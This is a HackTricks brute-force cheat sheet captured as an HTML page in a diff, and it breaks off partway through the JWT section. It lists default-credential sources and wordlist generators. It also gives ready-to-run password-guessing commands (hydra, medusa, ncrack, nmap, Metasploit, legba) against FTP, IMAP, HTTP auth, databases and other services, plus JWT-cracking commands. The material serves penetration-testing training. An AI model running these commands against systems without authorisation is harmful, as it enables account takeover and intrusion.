@@ -1,0 +1,1103 @@
+<!DOCTYPE HTML>
+<html lang="en" class="hacktricks-light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Brute Force - CheatSheet - HackTricks</title>
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../theme/pagetoc.css">
+        <link rel="stylesheet" href="../theme/tabs.css">
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var lang = "en";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "hacktricks-dark" : "hacktricks-light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('hacktricks-light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            var body = document.querySelector("body");
+            if (document.body.clientWidth >= 550) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+            <div id="search-wrapper" class="hidden">
+                <div id="search-modal">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <span class="fa fa-search"></span>
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="menu-bar-container">
+                        <div class="left-buttons">
+                            <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                                <i class="fa fa-bars"></i>
+                            </label>
+                            <a href="/">
+                                <h1 class="menu-title"><img src="../../../../../images/CLOUD-web-logo.png" alt="" style="width:auto;height:30px;vertical-align:middle;margin-right:5px;">HackTricks</h1>
+                            </a>
+
+                        </div>
+
+
+                        <div class="right-buttons">
+                            <div id="menubar-collapse">
+                                <a class="menu-bar-link" href="https://training.hacktricks.xyz" target="_blank">
+                                    Hacktricks Training
+                                </a>
+                                <a class="menu-bar-link" href="https://twitter.com/hacktricks_live" target="_blank">
+                                    Twitter
+                                </a>
+                                <a class="menu-bar-link" href="https://www.linkedin.com/company/hacktricks" target="_blank">
+                                    Linkedin
+                                </a>
+                                <a class="menu-bar-link" href="https://github.com/sponsors/carlospolop" target="_blank">
+                                    Sponsor
+                                </a>
+                            </div>
+                            <div class="icons">
+                                <div id="menubar-collapse-toggle" class="icon-button" type="button" title="Toggle menu bar" aria-label="Toggle Menu bar" aria-expanded="false" aria-controls="collapse">
+                                    <i class="fa fa-ellipsis-h"></i>
+                                    <div id="menubar-collapse-popup" class="menubar-collapse-popup" aria-label="Menu" role="menu">
+                                        <a href="https://training.hacktricks.xyz" target="_blank" role="menuitem" class="menu-bar-link">Hacktricks Training</a>
+                                        <a href="https://twitter.com/hacktricks_live" target="_blank" role="menuitem" class="menu-bar-link">Twitter</a>
+                                        <a href="https://www.linkedin.com/company/hacktricks" target="_blank" role="menuitem" class="menu-bar-link">Linkedin</a>
+                                        <a href="https://github.com/sponsors/carlospolop" target="_blank" role="menuitem" class="menu-bar-link">Sponsor</a>
+                                    </div>
+                                </div>
+
+                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                                    <i class="fa fa-search"></i>
+                                </button>
+
+                                <div id="menubar-languages-toggle" class="icon-button" type="button" title="Translations" aria-label="Toggle Tanslations" aria-expanded="false" aria-controls="translations">
+                                    <i class="fa fa-globe"></i>
+                                    <span class="menu-bar-link">Translations</span>
+                                    
+                                    <div id="menubar-languages-popup" class="menubar-languages-popup" aria-label="Language menu" role="language menu">
+                                        <button id="af" role="menuitem" class="menu-bar-link">Afrikaans</button>
+                                        <button id="zh" role="menuitem" class="menu-bar-link">Chinese</button>
+                                        <button id="en" role="menuitem" class="menu-bar-link">English</button>
+                                        <button id="fr" role="menuitem" class="menu-bar-link">French</button>
+                                        <button id="de" role="menuitem" class="menu-bar-link">German</button>
+                                        <button id="el" role="menuitem" class="menu-bar-link">Greek</button>
+                                        <button id="hi" role="menuitem" class="menu-bar-link">Hindi</button>
+                                        <button id="it" role="menuitem" class="menu-bar-link">Italian</button>
+                                        <button id="ja" role="menuitem" class="menu-bar-link">Japanese</button>
+                                        <button id="ko" role="menuitem" class="menu-bar-link">Korean</button>
+                                        <button id="pl" role="menuitem" class="menu-bar-link">Polish</button>
+                                        <button id="pt" role="menuitem" class="menu-bar-link">Portuguese</button>
+                                        <button id="sr" role="menuitem" class="menu-bar-link">Serbian</button>
+                                        <button id="es" role="menuitem" class="menu-bar-link">Spanish</button>
+                                        <button id="sw" role="menuitem" class="menu-bar-link">Swahili</button>
+                                        <button id="tr" role="menuitem" class="menu-bar-link">Turkish</button>
+                                        <button id="uk" role="menuitem" class="menu-bar-link">Ukrainian</button>
+                                    </div>
+                                </div>
+                            </div>
+
+
+                        </div>
+                    </div>
+                </div>
+                <div id="container" class="container">
+                    <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+                        <!-- populated by js -->
+                        <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+                        <noscript>
+                            <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+                        </noscript>
+                    </nav>
+                    <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                    <script>
+                        document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                        document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                        Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                            link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                        });
+                    </script>
+
+                    <div id="content" class="content">
+                        <main>
+                            <div class="mobilesponsor-wrapper">
+
+                            <a class="mobilesponsor" href="" target="_blank">
+                                <img src="" alt="" srcset="">
+                                <div class="mobilesponsor-title">
+                                </div>
+                                <div class="mobilesponsor-description">
+                                </div>
+                                <div class="mobilesponsor-cta"></div>
+                            </a>
+                            </div>
+                            <style>
+.mdbook-alerts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-left: 0.25em solid var(--mdbook-alerts-color);
+}
+
+.mdbook-alerts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-alerts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-alerts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-alerts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-alerts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-alerts-icon);
+  mask-image: var(--mdbook-alerts-icon);
+}
+
+.mdbook-alerts-note {
+  --mdbook-alerts-color: rgb(9, 105, 218);
+  /* https://icon-sets.iconify.design/material-symbols/info-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 17q.425 0 .713-.288T13 16v-4q0-.425-.288-.712T12 11q-.425 0-.712.288T11 12v4q0 .425.288.713T12 17m0-8q.425 0 .713-.288T13 8q0-.425-.288-.712T12 7q-.425 0-.712.288T11 8q0 .425.288.713T12 9m0 13q-2.075 0-3.9-.788t-3.175-2.137q-1.35-1.35-2.137-3.175T2 12q0-2.075.788-3.9t2.137-3.175q1.35-1.35 3.175-2.137T12 2q2.075 0 3.9.788t3.175 2.137q1.35 1.35 2.138 3.175T22 12q0 2.075-.788 3.9t-2.137 3.175q-1.35 1.35-3.175 2.138T12 22m0-2q3.35 0 5.675-2.325T20 12q0-3.35-2.325-5.675T12 4Q8.65 4 6.325 6.325T4 12q0 3.35 2.325 5.675T12 20m0-8"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-tip {
+  --mdbook-alerts-color: rgb(26, 127, 55);
+  /* https://icon-sets.iconify.design/material-symbols/lightbulb-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 22q-.825 0-1.412-.587T10 20h4q0 .825-.587 1.413T12 22m-3-3q-.425 0-.712-.288T8 18q0-.425.288-.712T9 17h6q.425 0 .713.288T16 18q0 .425-.288.713T15 19zm-.75-3q-1.725-1.025-2.738-2.75T4.5 9.5q0-3.125 2.188-5.312T12 2q3.125 0 5.313 2.188T19.5 9.5q0 2.025-1.012 3.75T15.75 16zm.6-2h6.3q1.125-.8 1.738-1.975T17.5 9.5q0-2.3-1.6-3.9T12 4Q9.7 4 8.1 5.6T6.5 9.5q0 1.35.613 2.525T8.85 14M12 14"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-important {
+  --mdbook-alerts-color: rgb(130, 80, 223);
+  /* https://icon-sets.iconify.design/material-symbols/chat-info-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 7q.425 0 .713-.288T13 6q0-.425-.288-.712T12 5q-.425 0-.712.288T11 6q0 .425.288.713T12 7m0 8q.425 0 .713-.288T13 14v-4q0-.425-.288-.712T12 9q-.425 0-.712.288T11 10v4q0 .425.288.713T12 15m-6 3l-2.3 2.3q-.475.475-1.088.213T2 19.575V4q0-.825.588-1.412T4 2h16q.825 0 1.413.588T22 4v12q0 .825-.587 1.413T20 18zm-.85-2H20V4H4v13.125zM4 16V4z"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-warning {
+  --mdbook-alerts-color: rgb(154, 103, 0);
+  /* https://icon-sets.iconify.design/material-symbols/warning-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M2.725 21q-.275 0-.5-.137t-.35-.363q-.125-.225-.137-.488t.137-.512l9.25-16q.15-.25.388-.375T12 3q.25 0 .488.125t.387.375l9.25 16q.15.25.138.513t-.138.487q-.125.225-.35.363t-.5.137zm1.725-2h15.1L12 6zM12 18q.425 0 .713-.288T13 17q0-.425-.288-.712T12 16q-.425 0-.712.288T11 17q0 .425.288.713T12 18m0-3q.425 0 .713-.288T13 14v-3q0-.425-.288-.712T12 10q-.425 0-.712.288T11 11v3q0 .425.288.713T12 15m0-2.5"%2F%3E%3C%2Fsvg%3E');
+}
+
+.mdbook-alerts-caution {
+  --mdbook-alerts-color: rgb(207, 34, 46);
+  /* https://icon-sets.iconify.design/material-symbols/brightness-alert-outline-rounded/ */
+  --mdbook-alerts-icon: url('data:image/svg+xml,%3Csvg xmlns="http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg" width="24" height="24" viewBox="0 0 24 24"%3E%3Cpath fill="currentColor" d="M12 17q.425 0 .713-.288T13 16q0-.425-.288-.712T12 15q-.425 0-.712.288T11 16q0 .425.288.713T12 17m0-4q.425 0 .713-.288T13 12V8q0-.425-.288-.712T12 7q-.425 0-.712.288T11 8v4q0 .425.288.713T12 13m-3.35 7H6q-.825 0-1.412-.587T4 18v-2.65L2.075 13.4q-.275-.3-.425-.662T1.5 12q0-.375.15-.737t.425-.663L4 8.65V6q0-.825.588-1.412T6 4h2.65l1.95-1.925q.3-.275.663-.425T12 1.5q.375 0 .738.15t.662.425L15.35 4H18q.825 0 1.413.588T20 6v2.65l1.925 1.95q.275.3.425.663t.15.737q0 .375-.15.738t-.425.662L20 15.35V18q0 .825-.587 1.413T18 20h-2.65l-1.95 1.925q-.3.275-.662.425T12 22.5q-.375 0-.737-.15t-.663-.425zm.85-2l2.5 2.5l2.5-2.5H18v-3.5l2.5-2.5L18 9.5V6h-3.5L12 3.5L9.5 6H6v3.5L3.5 12L6 14.5V18zm2.5-6"%2F%3E%3C%2Fsvg%3E');
+}
+
+</style>
+<style>
+div.codeblock_filename_container + pre {
+  margin-top: 0;
+}
+
+span.codeblock_filename_inner {
+  border-radius: 0.4rem 0.4rem 0 0;
+  padding: 0.6rem 1rem 0.6rem 1rem;
+  font-family: var(--mono-font) !important;
+  font-size: var(--code-font-size);
+}
+
+</style>
+<h1 id="brute-force---cheatsheet"><a class="header" href="#brute-force---cheatsheet">Brute Force - CheatSheet</a></h1>
+<p>Reading time: 24 minutes</p>
+<div class="mdbook-alerts mdbook-alerts-tip">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  tip
+</p>
+<p>Learn &amp; practice AWS Hacking:<img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><br />
+Learn &amp; practice GCP Hacking: <img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong></a><img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+</div>
+<h2 id="default-credentials"><a class="header" href="#default-credentials">Default Credentials</a></h2>
+<p><strong>Search in google</strong> for default credentials of the technology that is being used, or <strong>try these links</strong>:</p>
+<ul>
+<li><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet"><strong>https://github.com/ihebski/DefaultCreds-cheat-sheet</strong></a></li>
+<li><a href="http://www.phenoelit.org/dpl/dpl.html"><strong>http://www.phenoelit.org/dpl/dpl.html</strong></a></li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/passwordsC.htm"><strong>http://www.vulnerabilityassessment.co.uk/passwordsC.htm</strong></a></li>
+<li><a href="https://192-168-1-1ip.mobi/default-router-passwords-list/"><strong>https://192-168-1-1ip.mobi/default-router-passwords-list/</strong></a></li>
+<li><a href="https://datarecovery.com/rd/default-passwords/"><strong>https://datarecovery.com/rd/default-passwords/</strong></a></li>
+<li><a href="https://bizuns.com/default-passwords-list"><strong>https://bizuns.com/default-passwords-list</strong></a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv"><strong>https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv</strong></a></li>
+<li><a href="https://github.com/Dormidera/WordList-Compendium"><strong>https://github.com/Dormidera/WordList-Compendium</strong></a></li>
+<li><a href="https://www.cirt.net/passwords"><strong>https://www.cirt.net/passwords</strong></a></li>
+<li><a href="http://www.passwordsdatabase.com"><strong>http://www.passwordsdatabase.com/</strong></a></li>
+<li><a href="https://many-passwords.github.io"><strong>https://many-passwords.github.io/</strong></a></li>
+<li><a href="https://theinfocentric.com/"><strong>https://theinfocentric.com/</strong></a></li>
+</ul>
+<h2 id="create-your-own-dictionaries"><a class="header" href="#create-your-own-dictionaries"><strong>Create your own Dictionaries</strong></a></h2>
+<p>Find as much information about the target as you can and generate a custom dictionary. Tools that may help:</p>
+<h3 id="crunch"><a class="header" href="#crunch">Crunch</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)
+
+@ Lower case alpha characters
+, Upper case alpha characters
+% Numeric characters
+^ Special characters including spac
+crunch 6 8 -t ,@@^^%%
+</code></pre>
+<h3 id="website-based-wordlists"><a class="header" href="#website-based-wordlists">Website based wordlists</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># Cewl gets words from the victims page
+cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
+</code></pre>
+<h3 id="cupp"><a class="header" href="#cupp"><a href="https://github.com/Mebus/cupp">CUPP</a></a></h3>
+<p>Generate passwords based on your knowledge of the victim (names, dates...)</p>
+<pre><code>python3 cupp.py -h
+</code></pre>
+<h3 id="wister"><a class="header" href="#wister"><a href="https://github.com/cycurity/wister">Wister</a></a></h3>
+<p>A wordlist generator tool, that allows you to supply a set of words, giving you the possibility to craft multiple variations from the given words, creating a unique and ideal wordlist to use regarding a specific target.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
+
+ __          _______  _____ _______ ______ _____
+ \ \        / /_   _|/ ____|__   __|  ____|  __ \
+  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
+   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
+    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
+     \/  \/   |_____|_____/   |_|  |______|_|  \_\
+
+      Version 1.0.3                    Cycurity
+
+Generating wordlist...
+[########################################] 100%
+Generated 67885 lines.
+
+Finished in 0.920s.
+</code></pre>
+<h3 id="pydictor"><a class="header" href="#pydictor"><a href="https://github.com/LandGrey/pydictor">pydictor</a></a></h3>
+<h3 id="wordlists"><a class="header" href="#wordlists">Wordlists</a></h3>
+<ul>
+<li><a href="https://github.com/danielmiessler/SecLists"><strong>https://github.com/danielmiessler/SecLists</strong></a></li>
+<li><a href="https://github.com/Dormidera/WordList-Compendium"><strong>https://github.com/Dormidera/WordList-Compendium</strong></a></li>
+<li><a href="https://github.com/kaonashi-passwords/Kaonashi"><strong>https://github.com/kaonashi-passwords/Kaonashi</strong></a></li>
+<li><a href="https://github.com/google/fuzzing/tree/master/dictionaries"><strong>https://github.com/google/fuzzing/tree/master/dictionaries</strong></a></li>
+<li><a href="https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm"><strong>https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm</strong></a></li>
+<li><a href="https://weakpass.com/wordlist/"><strong>https://weakpass.com/wordlist/</strong></a></li>
+<li><a href="https://wordlists.assetnote.io/"><strong>https://wordlists.assetnote.io/</strong></a></li>
+<li><a href="https://github.com/fssecur3/fuzzlists"><strong>https://github.com/fssecur3/fuzzlists</strong></a></li>
+<li><a href="https://hashkiller.io/listmanager"><strong>https://hashkiller.io/listmanager</strong></a></li>
+<li><a href="https://github.com/Karanxa/Bug-Bounty-Wordlists"><strong>https://github.com/Karanxa/Bug-Bounty-Wordlists</strong></a></li>
+</ul>
+<h2 id="services"><a class="header" href="#services">Services</a></h2>
+<p>Ordered alphabetically by service name.</p>
+<h3 id="afp"><a class="header" href="#afp">AFP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap -p 548 --script afp-brute &lt;IP&gt;
+msf&gt; use auxiliary/scanner/afp/afp_login
+msf&gt; set BLANK_PASSWORDS true
+msf&gt; set USER_AS_PASS true
+msf&gt; set PASS_FILE &lt;PATH_PASSWDS&gt;
+msf&gt; set USER_FILE &lt;PATH_USERS&gt;
+msf&gt; run
+</code></pre>
+<h3 id="ajp"><a class="header" href="#ajp">AJP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap --script ajp-brute -p 8009 &lt;IP&gt;
+</code></pre>
+<h2 id="amqp-activemq-rabbitmq-qpid-joram-and-solace"><a class="header" href="#amqp-activemq-rabbitmq-qpid-joram-and-solace">AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)</a></h2>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
+</code></pre>
+<h3 id="cassandra"><a class="header" href="#cassandra">Cassandra</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap --script cassandra-brute -p 9160 &lt;IP&gt;
+# legba ScyllaDB / Apache Casandra
+legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
+</code></pre>
+<h3 id="couchdb"><a class="header" href="#couchdb">CouchDB</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">msf&gt; use auxiliary/scanner/couchdb/couchdb_login
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+</code></pre>
+<h3 id="docker-registry"><a class="header" href="#docker-registry">Docker Registry</a></h3>
+<pre><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
+</code></pre>
+<h3 id="elasticsearch"><a class="header" href="#elasticsearch">Elasticsearch</a></h3>
+<pre><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
+</code></pre>
+<h3 id="ftp"><a class="header" href="#ftp">FTP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
+ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp
+legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
+</code></pre>
+<h3 id="http-generic-brute"><a class="header" href="#http-generic-brute">HTTP Generic Brute</a></h3>
+<h4 id="wfuzz"><a class="header" href="#wfuzz"><a href="../pentesting-web/web-tool-wfuzz.html"><strong>WFuzz</strong></a></a></h4>
+<h3 id="http-basic-auth"><a class="header" href="#http-basic-auth">HTTP Basic Auth</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
+# Use https-get mode for https
+medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T 10
+legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
+</code></pre>
+<h3 id="http---ntlm"><a class="header" href="#http---ntlm">HTTP - NTLM</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+</code></pre>
+<h3 id="http---post-form"><a class="header" href="#http---post-form">HTTP - Post Form</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect" -V
+# Use https-post-form mode for https
+</code></pre>
+<p>For http<strong>s</strong> you have to change from "http-post-form" to "<strong>https-post-form"</strong></p>
+<h3 id="http---cms----wordpress-joomla-or-drupal-or-moodle"><a class="header" href="#http---cms----wordpress-joomla-or-drupal-or-moodle"><strong>HTTP - CMS --</strong> (W)ordpress, (J)oomla or (D)rupal or (M)oodle</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cmsmap -f W/J/D/M -u a -p a https://wordpress.com
+# Check also https://github.com/evilsocket/legba/wiki/HTTP
+</code></pre>
+<h3 id="imap"><a class="header" href="#imap">IMAP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f &lt;IP&gt; imap -V
+nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;
+legba imap --username user --password data/passwords.txt --target localhost:993
+</code></pre>
+<h3 id="irc"><a class="header" href="#irc">IRC</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;
+</code></pre>
+<h3 id="iscsi"><a class="header" href="#iscsi">ISCSI</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 &lt;IP&gt;
+</code></pre>
+<h3 id="jwt"><a class="header" href="#jwt">JWT</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#hashcat
+hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
+
+#https://github.com/Sjord/jwtcrack
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+
+#John
+john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
+
+#https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;
+
+#https://github.com/brendan-rius/c-jwt-cracker
